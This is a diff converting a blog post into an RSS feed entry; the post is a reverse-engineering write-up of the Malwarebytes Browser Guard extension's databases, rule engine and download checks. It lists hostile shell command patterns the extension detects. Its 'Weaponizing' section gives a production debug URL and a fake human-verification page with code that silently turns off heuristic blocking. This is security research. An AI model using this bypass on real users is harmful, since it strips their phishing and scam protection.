@@ -1,82 +1,37 @@
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Reverse engineering Malwarebytes Browser Guard | miltinh0c - Security Write-ups</title>
-<meta name="description" content="Static analysis of Browser Guard 3.1.5 (15M+ installs): Zstd-encoded on-disk databases, the heuristic rule engine that scans the live DOM, the Hubble false-positive service, the package update protocol, and a debug URL interface left in production. With reimplementations in C# and Python.">
-<meta name="author" content="miltinh0c">
-<link rel="canonical" href="https://msil.re/posts/reversing-malwarebytes-browser-guard.html">
-<meta property="og:title" content="Reverse engineering Malwarebytes Browser Guard | miltinh0c - Security Write-ups">
-<meta property="og:description" content="Static analysis of Browser Guard 3.1.5 (15M+ installs): Zstd-encoded on-disk databases, the heuristic rule engine that scans the live DOM, the Hubble false-positive service, the package update protocol, and a debug URL interface left in production. With reimplementations in C# and Python.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://msil.re/posts/reversing-malwarebytes-browser-guard.html">
-<meta property="og:image" content="https://msil.re/assets/images/browserguard.png">
-<meta property="og:image:alt" content="Reverse engineering Malwarebytes Browser Guard">
-<meta property="og:site_name" content="miltinh0c">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Reverse engineering Malwarebytes Browser Guard | miltinh0c - Security Write-ups">
-<meta name="twitter:description" content="Static analysis of Browser Guard 3.1.5 (15M+ installs): Zstd-encoded on-disk databases, the heuristic rule engine that scans the live DOM, the Hubble false-positive service, the package update protocol, and a debug URL interface left in production. With reimplementations in C# and Python.">
-<meta name="twitter:image" content="https://msil.re/assets/images/browserguard.png">
-<meta name="twitter:image:alt" content="Reverse engineering Malwarebytes Browser Guard">
-<meta name="theme-color" content="#14121a">
-<meta name="robots" content="index, follow, noai, noimageai">
-<meta name="googlebot" content="index, follow, noai, noimageai">
-<link rel="icon" type="image/png" sizes="32x32" href="../assets/favicon-32.png">
-<link rel="apple-touch-icon" sizes="180x180" href="../assets/apple-touch-icon.png">
-<link rel="alternate" type="application/rss+xml" title="miltinh0c - Security Write-ups" href="../feed.xml">
-<link rel="stylesheet" href="../assets/css/style.css">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Reverse engineering Malwarebytes Browser Guard", "description": "Static analysis of Browser Guard 3.1.5 (15M+ installs): Zstd-encoded on-disk databases, the heuristic rule engine that scans the live DOM, the Hubble false-positive service, the package update protocol, and a debug URL interface left in production. With reimplementations in C# and Python.", "image": "https://msil.re/assets/images/browserguard.png", "datePublished": "2026-05-20", "dateModified": "2026-05-20", "timeRequired": "PT36M", "author": {"@type": "Person", "name": "miltinh0c", "url": "https://github.com/miltinhoc"}, "publisher": {"@type": "Person", "name": "miltinh0c", "logo": {"@type": "ImageObject", "url": "https://msil.re/assets/favicon.svg"}}, "mainEntityOfPage": "https://msil.re/posts/reversing-malwarebytes-browser-guard.html", "keywords": "reverse-engineering, browser-extension, malwarebytes, javascript", "url": "https://msil.re/posts/reversing-malwarebytes-browser-guard.html"}</script>
-<meta property="article:published_time" content="2026-05-20">
-<meta property="article:modified_time" content="2026-05-20">
-<meta property="article:author" content="miltinh0c">
-<meta property="article:tag" content="reverse-engineering">
-<meta property="article:tag" content="browser-extension">
-<meta property="article:tag" content="malwarebytes">
-<meta property="article:tag" content="javascript">
-</head>
-<body class="post-page">
-<header class="site-header">
-  <div class="wrap">
-    <a class="brand" href="../index.html" aria-label="miltinh0c // blog">
-      <img src="../assets/brand.png" alt="miltinh0c // blog" class="brand-logo">
-    </a>
-    <nav class="site-nav">
-      <a href="../about.html">about</a>
-    </nav>
-  </div>
-</header>
-<main class="wrap post-layout">
-
-<article class="post">
-  <header class="post-header">
-    <div class="post-meta">
-      <time datetime="2026-05-20">2026-05-20</time>
-      <span class="sep">::</span>
-      <span class="read-time">36 min read</span>
-      <span class="sep">::</span>
-      <span class="tags"><span class="tag">#reverse-engineering</span> <span class="tag">#browser-extension</span> <span class="tag">#malwarebytes</span> <span class="tag">#javascript</span></span>
-    </div>
-    <h1 class="post-title">Reverse engineering Malwarebytes Browser Guard</h1>
-    <p class="post-summary">Static analysis of Browser Guard 3.1.5 (15M+ installs): Zstd-encoded on-disk databases, the heuristic rule engine that scans the live DOM, the Hubble false-positive service, the package update protocol, and a debug URL interface left in production. With reimplementations in C# and Python.</p>
-  </header>
-  <div class="post-body">
-<h2 id="how-this-started">How this started</h2>
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>miltinh0c - Security Write-ups</title>
+    <link>https://msil.re/</link>
+    <description>Reverse engineering, malware analysis, and offensive security write-ups.</description>
+    <language>en</language>
+    <lastBuildDate>Wed, 20 May 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://msil.re/feed.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>Reverse engineering Malwarebytes Browser Guard</title>
+      <link>https://msil.re/posts/reversing-malwarebytes-browser-guard.html</link>
+      <guid isPermaLink="true">https://msil.re/posts/reversing-malwarebytes-browser-guard.html</guid>
+      <pubDate>Wed, 20 May 2026 00:00:00 +0000</pubDate>
+      <category>reverse-engineering</category>
+      <category>browser-extension</category>
+      <category>malwarebytes</category>
+      <category>javascript</category>
+      <description>Static analysis of Browser Guard 3.1.5 (15M+ installs): Zstd-encoded on-disk databases, the heuristic rule engine that scans the live DOM, the Hubble false-positive service, the package update protocol, and a debug URL interface left in production. With reimplementations in C# and Python.</description>
+      <content:encoded><![CDATA[<h2 id="how-this-started">How this started</h2>
 <p>Malwarebytes Browser Guard flagged a site I was visiting with <code>scam_heuristic</code>, rule ID <code>21998111</code>. I wanted to see the rule.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211319.png" alt="" loading="lazy"></figure>
-<figure><img src="../assets/images/Pasted%20image%2020260520211323.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211319.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211323.png" alt="" loading="lazy"></figure>
 <p>Browser Guard has about 15 million installs across Chrome, Firefox, and Edge, so whatever logic produced that ID is running in a lot of browsers.</p>
 <p>What started as "let me look up one rule" turned into the analysis below.</p>
 <h2 id="a-quick-detour-source-maps-and-readable-code">A quick detour: source maps and readable code</h2>
 <p>While digging through the extension files, I saw a large number of JavaScript bundles shipped alongside .map files.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211331.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211331.png" alt="" loading="lazy"></figure>
 <p>These source maps contained full <code>sourcesContent</code> entries, meaning the original (or near-original) source code was embedded directly inside them.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211335.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211335.png" alt="" loading="lazy"></figure>
 <p>A few things that were present on the code:</p>
 <ul><li>Inline comments explaining code/decisions.</li><li>References to Jira issues. </li></ul>
-<figure><img src="../assets/images/Pasted%20image%2020260520211358.png" alt="" loading="lazy"></figure>
-<figure><img src="../assets/images/Pasted%20image%2020260520211402.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211358.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211402.png" alt="" loading="lazy"></figure>
 <p>In practice, this significantly reduced the effort required to understand how the extension works internally.</p>
 <h2 id="whats-covered">What's covered</h2>
 <p>This post documents a static analysis of Browser Guard 3.1.5. The on-disk databases and how they're encoded, the heuristic rule engine that scans the live DOM, the Hubble false-positive service, the package update protocol, and a debug URL interface left in the production build. Along the way I reimplement the bloom filter, Hubble client, and updater in C#, and the heuristics engine in Python.</p>
@@ -87,15 +42,15 @@
 <p>On Chrome, the extension is unpacked under:</p>
 <pre class="language-bat"><code class="language-bat">%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\ihcjicgdanjaechkgeegckofjjedodee\&lt;version&gt;\
 </code></pre>
-<figure><img src="../assets/images/Pasted%20image%2020260520211429.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211429.png" alt="" loading="lazy"></figure>
 <p>There are many files and directories. The <code>db</code> directory immediately stood out.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211435.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211435.png" alt="" loading="lazy"></figure>
 <p>The data files in that directory are not immediately readable. Several of them are stored as compressed blobs with no file extension.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211441.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211441.png" alt="" loading="lazy"></figure>
 <p>The next step was to determine the encoding of these blobs.</p>
 <h2 id="2-identifying-the-compression-format">2. Identifying the compression format</h2>
 <p>After checking a bunch of files in a hex editor, I noticed all of them had the same first bytes: <code>28 B5 2F</code></p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211450.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211450.png" alt="" loading="lazy"></figure>
 <p>A quick search on google shows that this matches Zstd-compressed data, which means the files can be decompressed easily.</p>
 <pre class="language-csharp"><code class="language-csharp">using ZstdSharp;
 
@@ -128,7 +83,7 @@ using (var input = File.OpenRead(&quot;mbgc.db.ads.2&quot;))
 <h3 id="hashing">Hashing</h3>
 <p>Browser Guards ships with its own bloom filter implementation (<code>utils/databases/bloom-filter.js</code>)</p>
 <p>The filter uses two hashes, <strong>djb2</strong> and <strong>sdbm</strong>, combined with <strong>Kirsch–Mitzenmacher</strong> double hashing.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211507.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211507.png" alt="" loading="lazy"></figure>
 <p>The Bloom filter acts as a fast pre-check. It allows the extension to quickly determine whether a domain might belong to a given category before performing more expensive checks.</p>
 <h3 id="categories">Categories</h3>
 <p>The decompressed files include multiple category filters. Threat-related filters include:</p>
@@ -266,9 +221,9 @@ private static void CheckHost(string host)
 CheckHost(&quot;amazon.com&quot;);
 </code></pre>
 <p>We get this result:</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211544.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211544.png" alt="" loading="lazy"></figure>
 <p>To confirm these results, we can actually visit the first host and check the response from Browser Guard:</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211549.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211549.png" alt="" loading="lazy"></figure>
 <p>At the end of the post we will also implement a small client to keep the bloom filters updated!</p>
 <h2 id="4-manifest-declared-rules">4. Manifest-declared rules</h2>
 <p>Before getting to the custom heuristic engine, it is worth noting that the extension also ships a set of rules that operate at a different level.</p>
@@ -293,19 +248,19 @@ CheckHost(&quot;amazon.com&quot;);
 <p><strong>Disabled by default:</strong></p>
 <ul><li><code>ads_1</code>, <code>ads_2</code>: Ad blocking rules, off unless the user enables ad blocking in settings</li><li><code>malware_1</code>: Malware URL rules at the DNR layer</li><li><code>easylist_1</code>, <code>easyprivacy_1</code>: Well-known EasyList and EasyPrivacy filter lists, compiled into DNR format</li></ul>
 <p>There are 108,106 rules present:<br></p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211603.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211603.png" alt="" loading="lazy"></figure>
 <p>If we visit a domain present on the <code>malware_1</code> rules, we get this block page:</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211607.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211607.png" alt="" loading="lazy"></figure>
 <h2 id="5-heuristic-rules">5. Heuristic rules</h2>
 <p>How it works at a high level:</p>
 <ol><li>The background service worker loads the decompressed heuristics DB.</li><li>The content script asks for that DB on page load.</li><li>The content script evaluates domain-scoped selector rules against the live page DOM.</li><li><code>adserver</code> matches hide elements in-page.</li><li><code>scam</code> and <code>phishing</code> matches are sent back to the background.</li><li>The background applies whitelist logic. If the domain isn't whitelisted, it kicks off a Hubble false-positive check (Section 8) and redirects the tab to the Browser Guard block page. The two happen in parallel, if the FPChecker cache already has the domain marked good, the block is skipped synchronously, otherwise the block page loads while Hubble is queried, and the tab is redirected back to the original URL if Hubble clears it.</li></ol>
 <p>The live bundled heuristics DB is overwhelmingly a phishing/scam collection:</p>
 <div class="table-wrap"><table><thead><tr><th>Rule Type</th><th>Rules Count</th></tr></thead><tbody><tr><td><code>*</code></td><td>1975</td></tr><tr><td><code>Phishing</code></td><td>1408</td></tr><tr><td><code>Scam</code></td><td>562</td></tr><tr><td><code>Adserver</code></td><td>5</td></tr></tbody></table></div>
-<figure><img src="../assets/images/Pasted%20image%2020260520211618.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211618.png" alt="" loading="lazy"></figure>
 <h3 id="dom-scanning">DOM Scanning</h3>
 <p>Heuristic scanning happens inside <code>hideHeuristicElements()</code>, which:</p>
 <ol><li>Lazily downloads the heuristics DB if it is not cached</li><li>Runs <code>processHeuristicsRules()</code> against the current page URL</li><li>Sends any page-block candidates to background</li><li>Hides any matched ad elements locally</li></ol>
-<figure><img src="../assets/images/Pasted%20image%2020260520211623.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211623.png" alt="" loading="lazy"></figure>
 <p>This function is called from two places:</p>
 <ul><li><strong>Once during initial page processing</strong>, when the content script first runs.</li><li><strong>From a debounced</strong> <code>MutationObserver</code> that watches <code>document.body</code> for newly inserted element nodes (<code>childList: true, subtree: true</code>).</li></ul>
 <p>Each batch of mutations starts (or resets) a 2000 ms timer,  the heuristic scan only runs after the page has been quiet for a full 2 seconds with no further element insertions. On a static page that finishes settling after load, that's typically 1 to 3 firings during initial render and then nothing, there is no continuous re-check while the page sits idle. Pages that keep mutating (SPAs, live tickers, late-loading content) keep retriggering, but only after each quiet window.</p>
@@ -342,7 +297,7 @@ CheckHost(&quot;amazon.com&quot;);
 </code></pre>
 <h3 id="how-matches-are-hidden">How matches are hidden</h3>
 <p>When the heuristic engine finds an element to hide, it doesn't remove it from the DOM. It adds a class. That class is defined in a stylesheet the extension injects into every page through a dynamic id chrome-extension URL, this happens because Browser Guard sets the <code>use_dynamic_url</code> property to <code>true</code>.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211646.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211646.png" alt="" loading="lazy"></figure>
 <p>The link tag looks like this:</p>
 <pre class="language-html"><code class="language-html">&lt;link rel=&quot;stylesheet&quot; href=&quot;chrome-extension://&lt;dynamic_id&gt;/app/content-style.css&quot;&gt;
 </code></pre>
@@ -488,7 +443,7 @@ observer.observe(document.documentElement, {
 </code></pre>
 <p>It fires on <strong>any domain</strong> when the page's <code>&lt;title&gt;</code> contains "sign in to office account" (case-insensitive).</p>
 <p>Visiting a test page with that title produces these logs in the service-worker console (but doesn't block it):</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211730.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211730.png" alt="" loading="lazy"></figure>
 <h3 id="separator-syntax">Separator syntax</h3>
 <p>The rule grammar uses the same separator concepts as cosmetic filter syntax:</p>
 <ul><li><code>domain##selector</code>: stored as <code>basic_selectors</code></li><li><code>domain#?#selector</code>: stored as <code>extended_selectors</code></li></ul>
@@ -505,7 +460,7 @@ observer.observe(document.documentElement, {
 <p>This compiles into one rule group with two selector objects. The group only matches if every selector in the chain matches.</p>
 <h3 id="supported-selector-operators">Supported selector operators</h3>
 <ul><li><code>:contains()</code></li><li><code>:xpath()</code></li><li><code>:properties()</code></li><li><code>:has()</code></li><li><code>:not()</code></li><li><code>:fmd5()</code></li><li>action operators <code>:click()</code> and <code>:remove()</code></li></ul>
-<figure><img src="../assets/images/Pasted%20image%2020260520211741.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211741.png" alt="" loading="lazy"></figure>
 <h3 id="most-common-domain-scopes">Most common domain scopes</h3>
 <div class="table-wrap"><table><thead><tr><th>Scope</th><th>Number of rules</th></tr></thead><tbody><tr><td><code>*</code></td><td>418</td></tr><tr><td><code>*.github.io</code></td><td>167</td></tr><tr><td><code>*.vercel.app</code></td><td>158</td></tr><tr><td><code>*.pages.dev</code></td><td>133</td></tr><tr><td><code>*.webflow.io</code></td><td>99</td></tr><tr><td><code>*.weebly.com</code></td><td>97</td></tr><tr><td><code>*.r2.dev</code></td><td>94</td></tr><tr><td><code>*.dweb.link</code></td><td>75</td></tr><tr><td><code>*.workers.dev</code></td><td>68</td></tr><tr><td><code>*.netlify.app</code></td><td>63</td></tr><tr><td><code>*.web.app</code></td><td>56</td></tr><tr><td><code>*.firebaseapp.com</code></td><td>54</td></tr><tr><td><code>ipfs.io</code></td><td>49</td></tr></tbody></table></div>
 <h3 id="small-heuristics-engine-in-python">Small Heuristics engine in python</h3>
@@ -530,11 +485,11 @@ observer.observe(document.documentElement, {
 <p>There is a smaller set of <code>script:contains()</code> rules looking for:</p>
 <ul><li>Telegram API exfiltration references</li><li>Clickfix related strings</li><li>Obfuscated strings</li><li>Known JavaScript marker strings</li></ul>
 <p>Examples:</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211817.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211817.png" alt="" loading="lazy"></figure>
 <p>The rules above are shown as images because GitBook renders the page with JavaScript, which means the rule strings themselves end up inside a <code>&lt;script&gt;</code> tag:</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211822.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211822.png" alt="" loading="lazy"></figure>
 <p>This ends up triggering a detection, not only for my blog, but for any blog (GitBook or not) that renders pages the same way. For example, all these trigger a detection as well:</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211831.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211831.png" alt="" loading="lazy"></figure>
 <h3 id="scam-fake-alert-fake-verification-text">Scam / Fake-alert / Fake-verification text</h3>
 <p>Scam-oriented rules for:</p>
 <ul><li>Fake account-security prompts</li><li>Fake robot checks</li><li>Fake delivery/payment notices</li><li>Fake Windows alert pages</li></ul>
@@ -832,10 +787,10 @@ application/hta
 <h3 id="risk-based-tld-scoring">Risk-based TLD scoring</h3>
 <p>The full <code>tldRiskLevel</code> map assigns a numeric weight to over 80 TLDs. The values are 1, 2, or 3, lower numbers indicate higher abuse prevalence in observed campaigns.</p>
 <p>The risk level directly controls which extension lists are checked. A download from a risk-1 TLD is checked against all six extension groups including disk images. A download from a risk-3 TLD is only checked against executables, scripts, and the Firefox workaround list.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520211958.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520211958.png" alt="" loading="lazy"></figure>
 <h3 id="url-pattern-matching">URL pattern matching</h3>
 <p>Two patterns are applied to download URLs:</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520212003.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212003.png" alt="" loading="lazy"></figure>
 <p>The first pattern matches any suspicious extension delivered from a WordPress path. </p>
 <p>The second, commented "Emotet" in the source, specifically targets <code>.exe</code> files served from known WordPress directories, reflecting a specific observed campaign delivery method.</p>
 <h3 id="named-campaign-patterns">Named campaign patterns</h3>
@@ -900,22 +855,22 @@ export const validRedirectUrls = [
 <p>A separate function, <code>safePatternFilename()</code>, acts as a whitelist gate before a download warning is shown. It returns one of three values: </p>
 <ul><li><code>true</code>: safe, suppress the warning</li><li><code>false</code>: not safe</li><li><code>null</code>: abstain / defer to other signals</li></ul>
 <p>Risky TLDs and IP-hosted downloads return <code>null</code> rather than <code>false</code>, meaning this function explicitly opts out of suppressing those cases.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520212201.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212201.png" alt="" loading="lazy"></figure>
 <p>Before any filename logic runs, if the subdomain is exactly <code>download</code> or <code>dl</code>, the function returns <code>true</code> immediately. </p>
 <p>This means any file served from a subdomain named <code>download</code> or <code>dl</code> bypasses all filename heuristics entirely. A URL like <code>download.example.com/file.exe</code> is considered safe without further checks.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520212207.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212207.png" alt="" loading="lazy"></figure>
 <p>From there, the function only continues for <code>dmg</code>, <code>exe</code>, <code>msi</code>, <code>zip</code>, and <code>7z</code> files. Everything else returns <code>null</code>.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520212211.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212211.png" alt="" loading="lazy"></figure>
 <p>Safe indicators checked against the filename include:</p>
 <ul><li>Keyword substrings: <code>install</code>, <code>installer</code>, <code>setup</code>, <code>portable</code>, <code>converter</code>, <code>webcam</code>, <code>recovery</code></li><li>PDF tool names: <code>pdftojpg</code>, <code>pdftoword</code>, <code>pdftoexcel</code> (exe only)</li><li>CloudFront keyword pairs (see CDN allowlist section above)</li><li>Semantic version patterns in the filename or URL path segments</li><li>Architecture strings in the filename: <code>x32</code>, <code>x64</code>, <code>x86</code>, <code>i386</code>, <code>win32</code>, <code>win64</code>, <code>msi64</code>, <code>msi86</code>, though for the Windows arch strings, they need to appear in both the filename and the path to count</li><li>Path segments equal to <code>64bit</code> or <code>32bit</code></li><li>Domain keywords in the second-level domain: <code>backup</code>, <code>converter</code>, <code>disk</code>, <code>driver</code>, <code>editor</code>, <code>software</code>, <code>speed</code>, <code>system</code>, <code>tools</code>, <code>vpn</code>, <code>webcam</code></li><li>Domain-to-filename substring match (minimum 4 characters)</li><li>Referrer trust: a download from <code>download.example.com</code> or <code>cdn.example.com</code> referred by <code>example.com</code> is suppressed</li></ul>
-<figure><img src="../assets/images/Pasted%20image%2020260520212218.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212218.png" alt="" loading="lazy"></figure>
 <p>There's also a higher-level referrer check in <code>isSafeReferral()</code> to check if the page initiating the download is already on the whitelist and the referrer SLD matches the download SLD, the download passes. This function also has a hardcoded exception for <code>softpedia</code>.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520212222.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212222.png" alt="" loading="lazy"></figure>
 <p>There's a dedicated suppression for <code>paint.net</code>, matching patterns like <code>paintnet</code>, <code>paint_net</code>, and <code>paint dot net</code> against the URL.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520212227.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212227.png" alt="" loading="lazy"></figure>
 <h3 id="pe-header-detection">PE header detection</h3>
 <p>For certain downloads, the extension fetches the first bytes of the file at classification time and checks for the <code>MZ</code> DOS header:</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520212232.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212232.png" alt="" loading="lazy"></figure>
 <h2 id="10-tech-support-scam-and-browser-locker-detection">10. Tech support scam and browser locker detection</h2>
 <p>A dedicated content script referenced throughout the source as <code>TSS</code> (Tech Support Scam), handles a class of attacks that are neither URL-based nor download-based. These are pages that trap users through browser API abuse rather than malware delivery.</p>
 <h3 id="browser-locker-detection">Browser locker detection</h3>
@@ -963,12 +918,12 @@ export const validRedirectUrls = [
 <pre class="language-javascript"><code class="language-javascript">/(Windows-Security-c0de firewall|Windows Defender - Security warning|C00d0e0Info00Er0f0)/i;
 </code></pre>
 <p>And <code>document.body.outerHTML</code> against:</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520212308.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212308.png" alt="" loading="lazy"></figure>
 <p>Runs in two passes:</p>
 <ul><li><strong>At</strong> <code>DOMContentLoaded</code>: full <code>detectSuspiciousPage()</code>, the title regex against <code>document.head.outerHTML</code> and every body pattern against <code>document.body.outerHTML</code>.</li></ul>
-<figure><img src="../assets/images/Pasted%20image%2020260520212313.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212313.png" alt="" loading="lazy"></figure>
 <ul><li><strong>After 1 s via <code>setTimeout</code></strong>: a narrower re-check via <code>mbtss.isSuspiciousPage()</code>, only the suspicious audio-player detector and the <code>&lt;h2&gt;</code> Trojan-Spyware-Alert pattern. The head/body string lists are not re-evaluated after 1 s.</li></ul>
-<figure><img src="../assets/images/Pasted%20image%2020260520212318.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212318.png" alt="" loading="lazy"></figure>
 <h3 id="skimmer-protection-injection">Skimmer protection injection</h3>
 <p>When the URL matches <code>checkoutRegex</code>, the extension optionally injects a devtools spoof into the page:</p>
 <pre class="language-javascript"><code class="language-javascript">const checkoutRegex = new RegExp(&#x27;onepage|checkout|onestep|firecheckout|onestepcheckout|onepagecheckout|ordine|checkout$|cart$|checkouts|panier|paiement$&#x27;);
@@ -990,7 +945,7 @@ export const validRedirectUrls = [
 <ul><li>Network download commands (<code>curl</code>, <code>wget</code>)</li><li>Shell piping (<code>| bash</code>, <code>| powershell</code>)</li><li>Windows LOLBins (<code>cmd.exe</code>, <code>mshta</code>)</li><li>Destructive commands (<code>rm -rf</code>, <code>cp</code>, <code>mv</code>)</li><li>Command chaining and subshell execution (<code>;</code>, <code>$(</code>, backticks)</li></ul>
 <h3 id="clipboard-payload-heuristics">Clipboard Payload Heuristics</h3>
 <p>When Browser Guard detects a payload being copied, it injects a warning popup into the current page.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520212355.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212355.png" alt="" loading="lazy"></figure>
 <p>The popup is rendered inside a <strong>closed Shadow DOM</strong>, with the id <code>malwarebytes-root</code>.</p>
 <p>The closed mode means you can't query inside it, modify its styles, or tamper with its structure from outside. But the host element itself sits in the regular DOM like any other element.</p>
 <h3 id="triggering-the-popup">Triggering the popup</h3>
@@ -1426,7 +1381,7 @@ chrome.webRequest.onBeforeRequest.addListener((details) =&gt; {
 <pre class="language-none"><code class="language-none">chrome-extension://ihcjicgdanjaechkgeegckofjjedodee/app/eventpages/debugger.html?action=set-feature&amp;key=enableHeuristicBlocking&amp;value=false
 </code></pre>
 <p>And the following window appears:</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520212458.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212458.png" alt="" loading="lazy"></figure>
 <p>If we now visit a domain that would trigger an heuristics rule, nothing happens, the page is not blocked.</p>
 <h3 id="weaponizing">Weaponizing</h3>
 <p>There are a few ways we could use this, the most practical I came up with was using <code>window.open()</code> and closing the popup a few milliseconds later.</p>
@@ -1434,7 +1389,7 @@ chrome.webRequest.onBeforeRequest.addListener((details) =&gt; {
 <p><code>window.open</code> must be triggered by a user click, otherwise Chrome will block the popup and prompt the user for permission.</p>
 </div>
 <p>To overcome the user having to click something, I made a fake looking "Verify you are human" page that, when the user clicks the verify, the popup opens and disables the heuristics blocks.</p>
-<figure><img src="../assets/images/Pasted%20image%2020260520212508.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260520212508.png" alt="" loading="lazy"></figure>
 <pre class="language-javascript"><code class="language-javascript">// the onclick handler
 function startVerification() {
             const wf = &quot;left=-10000,top=-100000,width=1,height=1&quot;;
@@ -1449,67 +1404,773 @@ function startVerification() {
 <p>Most of its work happens locally. The bloom filters, heuristic rules, malware URL database, download classifier, and the rest all decide things on their own. Hubble only gets called after something has already been flagged, and only to undo the block.</p>
 <p>That design is reasonable, but it puts a lot of trust in the local code. The Hubble credentials are XOR-obfuscated in the bundle, but the source maps ship alongside it with the code in plain readable form. The desktop AV uses the same Hubble service, and although I haven't tested it, the same credentials may well work there too.</p>
 <p>The bigger issue is Section 13. The production extension ships a debug interface keyed to a malwarebytes.com URL that any page can navigate to. One of the actions turns off heuristic blocking globally.</p>
-<p>I haven't reported this to Malwarebytes. Past experience with their bug bounty hasn't been great, and the debug interface has been sitting in the production build long enough that someone there presumably knows about it.</p>
-  </div>
-  <nav class="post-adj"><a class="adj prev" href="digging-into-malwarebytes-support-tool.html"><span class="dir">&larr; previous</span><span class="adj-title">Digging Into Malwarebytes Support Tool</span></a><span class="adj empty"></span></nav>
-  <footer class="post-footer">
-    <a class="back" href="../index.html">&larr; back to index</a>
-  </footer>
-</article>
